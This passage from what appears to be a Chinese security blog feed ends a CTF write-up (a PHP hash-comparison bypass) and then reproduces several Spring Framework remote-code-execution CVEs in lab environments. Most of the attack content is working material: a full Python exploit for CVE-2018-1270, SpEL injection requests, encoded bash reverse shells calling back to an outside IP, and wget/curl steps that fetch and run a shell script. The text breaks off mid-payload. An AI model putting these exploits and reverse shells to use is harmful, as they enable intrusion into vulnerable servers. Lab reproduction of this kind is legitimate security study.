class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单数组绕过即可</p><blockquote><p>a[]&#x3D;1&amp;b&#x3D;2&amp;pwn[]&#x3D;1</p></blockquote><p><img src="http://img-blog.csdnimg.cn/7a032be4d34741b5a94b0828818d427b.png" alt="456"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="赛事WP" scheme="http://3143047748.github.io/categories/%E8%B5%9B%E4%BA%8BWP/"/>
    
    
    <category term="ctf" scheme="http://3143047748.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>spring系列漏洞复现</title>
    <link href="http://3143047748.github.io/2023/11/21/spring%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://3143047748.github.io/2023/11/21/spring%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-11-21T13:33:10.000Z</published>
    <updated>2024-11-20T02:14:53.574Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><h2 id="spring-Websocket-RCE-CVE-2018-1270"><a href="#spring-Websocket-RCE-CVE-2018-1270" class="headerlink" title="spring Websocket RCE(CVE-2018-1270)"></a>spring Websocket RCE(CVE-2018-1270)</h2><p>影响范围如⬇️：Spring Framework 4.3 - 4.3.15Spring Framework 5.0 - 5.0.5</p><h3 id="漏洞指纹"><a href="#漏洞指纹" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>url&#x2F;gs-guide-websocket<br><img src="https://img-blog.csdnimg.cn/1b2beb875de4447b9b098f8d1711d1bb.png" alt="789"><br>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">import</span> string<span class="token keyword">import</span> time<span class="token keyword">import</span> threading<span class="token keyword">import</span> logging<span class="token keyword">import</span> sys<span class="token keyword">import</span> jsonlogging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>stream<span class="token operator">=</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">random_str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>    letters <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>letters<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">SockJS</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>base <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>random_str<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>        self<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>        self<span class="token punctuation">.</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'Referer'</span><span class="token punctuation">:</span> url<span class="token punctuation">,</span>            <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'</span>        <span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>t <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>base<span class="token punctuation">&#125;</span></span><span class="token string">/htmlfile?c=_jp.vulhub'</span></span>        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> response<span class="token punctuation">.</span>iter_lines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> command<span class="token punctuation">,</span> headers<span class="token punctuation">,</span> body<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">[</span>command<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">]</span>        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>v<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span> <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> headers<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'\n\n'</span><span class="token punctuation">)</span>        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>body<span class="token punctuation">)</span>        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>base<span class="token punctuation">&#125;</span></span><span class="token string">/xhr_send?t=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>t<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">204</span><span class="token punctuation">:</span>            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"send '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">' data error."</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"send '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">' data success."</span></span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>sockjs <span class="token operator">=</span> SockJS<span class="token punctuation">(</span><span class="token string">'http://8.130.100.154:8080/gs-guide-websocket'</span><span class="token punctuation">)</span>sockjs<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'connect'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token string">'accept-version'</span><span class="token punctuation">:</span> <span class="token string">'1.1,1.0'</span><span class="token punctuation">,</span>    <span class="token string">'heart-beat'</span><span class="token punctuation">:</span> <span class="token string">'10000,10000'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'subscribe'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token string">'selector'</span><span class="token punctuation">:</span> <span class="token string">'T(java.lang.Runtime).getRuntime().exec(new String[]&#123;"/bin/bash","-c",'</span>                <span class="token string">'"exec 5&lt;>/dev/tcp/8.130.100.154/80;cat &lt;&amp;5 | while read line; do $line 2>&amp;5 >&amp;5; done"&#125;)'</span><span class="token punctuation">,</span>    <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string">'sub-0'</span><span class="token punctuation">,</span>    <span class="token string">'destination'</span><span class="token punctuation">:</span> <span class="token string">'/topic/greetings'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'vulhub'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>sockjs<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'send'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token string">'content-length'</span><span class="token punctuation">:</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'destination'</span><span class="token punctuation">:</span> <span class="token string">'/app/hello'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/3e294a607bba440aad29c99b3bcb6db7.png" alt="789"></p><h2 id="Spring-Data-RCE-CVE-2018-1273"><a href="#Spring-Data-RCE-CVE-2018-1273" class="headerlink" title="Spring Data RCE(CVE-2018-1273)"></a>Spring Data RCE(CVE-2018-1273)</h2><p>影响范围如⬇️：Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10) Spring Data REST 2.6 - 2.6.10 (Ingalls SR10) Spring Data Commons 2.0 to 2.0.5 (Kay SR5) Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p><h3 id="漏洞指纹-1"><a href="#漏洞指纹-1" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>不是很明显，可能存在spring框架和数据库交互的地方（例如表单）</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>主页面没有啥<br>使用目录扫描工具扫描到目录&#x2F;users，访问看看<br><img src="https://img-blog.csdnimg.cn/f0b8c2b4f54a4554a13d6966b1ba36d9.png" alt="132"><br>随便输入一点抓包<br><img src="https://img-blog.csdnimg.cn/b685efc72dc44c59a87a702f1d347a5f.png" alt="123"></p><p>改一下<br>使用dnslog测试一下</p><p>POST:</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;users?page&#x3D;&amp;size&#x3D;5 HTTP&#x2F;1.1Host: 8.130.100.1xx:8080Content-Length: 127Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;119.0.0.0 Safari&#x2F;537.36Origin: http:&#x2F;&#x2F;8.130.100.154:8080Content-Type: application&#x2F;x-www-form-urlencodedAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7Referer: http:&#x2F;&#x2F;8.130.100.154:8080&#x2F;users?page&#x3D;&amp;size&#x3D;5Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8Cookie: gosession&#x3D;MTY5OTg3OTkyMHxEWDhFQVFMX2dBQUJFQUVRQUFCQV80QUFBUVp6ZEhKcGJtY01CQUFDYVdRR2MzUnlhVzVuRENZQUpEUTFOR00zTmpJMUxUVTROalF0TkdFd1pDMWhOams0TFRRMVptRXhNakEwTjJSa1lRPT18PRHNBt47aG28oC6jqqZpQ79n0DnHBAy1NITTlRpY&#x3D;Connection: closeusername[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;ping 9r6b8g.dnslog.cn&quot;)]&#x3D;&amp;password&#x3D;&amp;repeatedPassword&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/1b476068d34b4973863ff9419cabccd7.png" alt="123"><br>那么就开始反弹一个shell<br><code>username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDAuMTU0LzgwIDA+JjE=&#125;|&#123;base64 -d&#125;|&#123;bash -i&#125;&quot;)]=&amp;password=&amp;repeatedPassword=</code></p><p>发现不成功，也不知道哪里出了问题<br>看下一种方法：</p><p>在自己的服务器上放一个shell脚本。然后开启http服务让受害者去访问这个地址。<br>服务器：<br>1、建立一个shell脚本</p><blockquote><p>exp.sh<br><code>bash -i &gt;&amp; /dev/tcp/8.130.xxx.1x4/80 0&gt;&amp;1</code></p></blockquote><p>2、开启HTTP服务</p><blockquote><p><code>python -m http.server</code><br><img src="https://img-blog.csdnimg.cn/ad824264849544c483b4c50ca6c36610.png" alt="465"></p></blockquote><p>3（可省略）、然后让靶机下载该文件到&#x2F;tmp目录下。（其他目录下可能要赋予权限，比较麻烦）</p><blockquote><p><code>wget http://x.x.xx.x/exp.sh</code><br><img src="https://img-blog.csdnimg.cn/fcc99b3be0934b59937aa6c5fa885b8a.png" alt="123"></p></blockquote><p>4、靶机使用curl命令将exp.sh写到&#x2F;tmp目录下。</p><blockquote><p><code>curl -o /tmp/exp.sh http://8.xxx.xxx.xx4:8000/exp.sh</code><br><img src="https://img-blog.csdnimg.cn/332e0dae85b04346996732f9db6661f6.png" alt="132"></p></blockquote><p>5、然后靶机运行shell文件</p><blockquote><p>bash &#x2F;tmp&#x2F;exp.sh</p></blockquote><p>成功连接上<br><img src="https://img-blog.csdnimg.cn/0fcc0411c56049c48b0be98c4c47f1a7.png" alt="123"></p><h2 id="Spring-Data-REST-RCE-CVE-2017-8046"><a href="#Spring-Data-REST-RCE-CVE-2017-8046" class="headerlink" title="Spring Data REST RCE(CVE-2017-8046)"></a>Spring Data REST RCE(CVE-2017-8046)</h2><p>影响版本：</p><p>Spring Data REST versions &lt; 2.5.12, 2.6.7, 3.0 RC3</p><p>Spring Boot version &lt; 2.0.0M4</p><p>Spring Data release trains &lt; Kay-RC3</p><h3 id="漏洞指纹-2"><a href="#漏洞指纹-2" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p><img src="https://img-blog.csdnimg.cn/9c1a7a21631b4f50ac3c3566cf68edb3.png" alt="132"></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"_links"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"customers"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"href"</span> <span class="token operator">:</span> <span class="token string">"http://x.x.x.x:8080/customers"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"profile"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"href"</span> <span class="token operator">:</span> <span class="token string">"http://x.x.x.x:8080/profile"</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到json格式的返回值，说明这是一个Restful风格的api服务器<br>指纹就是网页全是json,里面有一些类</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问&#x2F;customers&#x2F;1，符合漏洞指纹。<br><img src="https://img-blog.csdnimg.cn/31fee77b694e446b94dc0b35ec794cad.png" alt="465"></p><p>PATCH的值是SpEL表达式，添加请求头为Content-Type：application&#x2F;json-patch+json ，而且命令需要改为10进制编码。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PATCH /customers/1 HTTP/1.1Host: 8.130.100.154:8080Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: gosession=MTY5OTg3OTkyMHxEWDhFQVFMX2dBQUJFQUVRQUFCQV80QUFBUVp6ZEhKcGJtY01CQUFDYVdRR2MzUnlhVzVuRENZQUpEUTFOR00zTmpJMUxUVTROalF0TkdFd1pDMWhOams0TFRRMVptRXhNakEwTjJSa1lRPT18P_GIRHNBt47aG28oC6jqqZpQ79n0DnHBAy1NITTlRpY=If-None-Match: "0"If-Modified-Since: Tue, 21 Nov 2023 13:09:48 GMTContent-Type: application/json-patch+jsonConnection: closeContent-Length: 468[  &#123; "op": "replace",     "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,52,76,106,69,122,77,67,52,120,77,68,65,117,77,84,85,48,76,122,103,119,73,68,65,43,74,106,69,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125&#125;))/lastname",    "value": "exploit"   &#125;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的十进制就是<code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDAuMTU0LzgwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p><p>然后服务器监听端口，靶机这边再使用bp发送上述报文<br><img src="https://img-blog.csdnimg.cn/9aa440ec7c234562b7d533f45b55f0b2.png" alt="123"><br>发现成功反弹shell<br><img src="https://img-blog.csdnimg.cn/c05967577f1b42b98decea4522ce3e43.png" alt="123"></p><h2 id="Spring-Web-Flow-RCE-CVE-2017-4971"><a href="#Spring-Web-Flow-RCE-CVE-2017-4971" class="headerlink" title="Spring Web Flow RCE(CVE-2017-4971)"></a>Spring Web Flow RCE(CVE-2017-4971)</h2><p>影响范围<br>Spring Web Flow 2.4.0 - 2.4.4<br>详细漏洞分析<a href="https://paper.seebug.org/322/">Spring Web Flow 远程代码执行漏洞分析(CVE-2017-4971)</a></p><h3 id="漏洞指纹-3"><a href="#漏洞指纹-3" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>无明显漏洞指纹，在各种提交表单的地方可以尝试</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>1、MvcViewFactoryCreator对象的useSpringBeanBinding参数需要设置为false（默认值） </li><li>2、flow view 对象中设置BinderConfiguration对象为空</li></ul><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>随便登录一个账户，账号密码都已经给出<br><img src="https://img-blog.csdnimg.cn/15f73395f6ec4ae187a14ac8bf9cc982.png" alt="12"><br>登录之后随便进入一个房间<br><img src="https://img-blog.csdnimg.cn/b176f94d4f0e4299a75eff0f33298237.png" alt="123"><br>之后点击预定酒店(Book Hotel)<br>然后将信息随便完善一下<br><img src="https://img-blog.csdnimg.cn/4ccc00442da546639f1d0544b9f1a4e6.png" alt="456"><br>点击confirm，此时记得开启抓包，因为这里有csrf的token限制，所以重放是没有用的<br>先使用dnslog测试一下<br><img src="https://img-blog.csdnimg.cn/9d09a54848f540838c24075f2f941181.png" alt="123"><br> <img src="https://img-blog.csdnimg.cn/4670469add45474db6a6f9c04a5f022d.png" alt="123"></p><p>反弹shell</p><blockquote><p><code>_eventId_confirm=&amp;_csrf=eed53409-7b2a-4b0e-b00b-27e6beb51aeb&amp;_(new+java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/8.130.100.154/80+0&gt;%261&quot;)).start()=vulhub</code><br>（记得这样url编码一下，不然反弹不成功，已经试过了。。。）<br><img src="https://img-blog.csdnimg.cn/14655ebd8e5d42c7b07d0bbd8d4fdfc7.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/e8222bea59ba4ceda7ebd4dfcfbda40a.png" alt="123"></p></blockquote><h2 id="Spring-Security-OAuth2-RCE-CVE-2016-4977"><a href="#Spring-Security-OAuth2-RCE-CVE-2016-4977" class="headerlink" title="Spring Security OAuth2 RCE(CVE-2016-4977)"></a>Spring Security OAuth2 RCE(CVE-2016-4977)</h2><p>影响范围：<br>Spring Security OAuth 2.0 - 2.0.9<br>Spring Secutiry OAuth 1.0-1.0.5</p><h3 id="漏洞指纹-4"><a href="#漏洞指纹-4" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>访问</p><blockquote><p>&#x2F;oauth&#x2F;authorize?response_type&#x3D;${2*2}&amp;client_id&#x3D;acme&amp;scope&#x3D;openid&amp;redirect_uri&#x3D;<a href="http://test/">http://test</a></p></blockquote><p>存在登录页面<br>默认账号密码admin&#x2F;admin<br>然后回显这个画面 <img src="https://img-blog.csdnimg.cn/fabd0d40d6cb4ba5b54f44239db9a84e.png" alt="45"><br>说明就是存在漏洞<br>payload生成脚本</p><pre class="line-numbers language-python3" data-language="python3"><code class="language-python3">#!&#x2F;usr&#x2F;bin&#x2F;env pythonmessage &#x3D; input(&#39;Enter message to encode:&#39;)poc &#x3D; &#39;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#39; % ord(message[0])for ch in message[1:]:   poc +&#x3D; &#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch) poc +&#x3D; &#39;)&#125;&#39;print(poc)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/f3f7fc1fe795429caa2737e39ad6afe9.png" alt="123"><br>复制一下结果并且拼接到这里<br><code>oauth/authorize?response_type=$&#123;POC&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code><br>发现无回显 <img src="https://img-blog.csdnimg.cn/fc8d3e0dde30449fb8fcd267f88faadd.png" alt="12"></p><p>弹个shell试一试<br><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMDAuMTU0LzgwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code><br><img src="https://img-blog.csdnimg.cn/f7b18d6679974a3191d4e86d142da821.png" alt="123"><br>服务器监听端口</p><blockquote><p>nc -lvnp 80</p></blockquote><p>payload</p><blockquote><p><code>http://8.130.100.154:8080/oauth/authorize?response_type=$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(68)).concat(T(